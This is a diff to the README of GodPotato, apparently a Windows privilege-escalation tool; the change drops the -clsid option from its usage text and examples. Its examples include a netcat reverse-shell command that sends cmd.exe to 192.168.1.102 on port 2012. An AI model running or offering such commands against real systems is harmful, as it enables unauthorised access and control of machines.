@@ -37,13 +37,11 @@ Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
 
 Arguments:
 
-        -clsid Required:False Clsid (default {4991d34b-80a1-4291-83b6-3328366b9097})
         -cmd Required:True CommandLine (default cmd /c whoami)
 
 Example:
 
 GodPotato -cmd "cmd /c whoami"
-GodPotato -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "cmd /c whoami"
 
 
 ```
@@ -62,7 +60,7 @@ GodPotato -cmd "cmd /c whoami"
 Customize Clsid and execute commands
 
 ```
-GodPotato -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "cmd /c whoami"
+GodPotato -cmd "cmd /c whoami"
 
 ```
 
@@ -73,7 +71,7 @@ GodPotato -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "cmd /c whoami"
 Execute reverse shell commands
 
 ```
-GodPotato -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
+GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 # Thanks
 
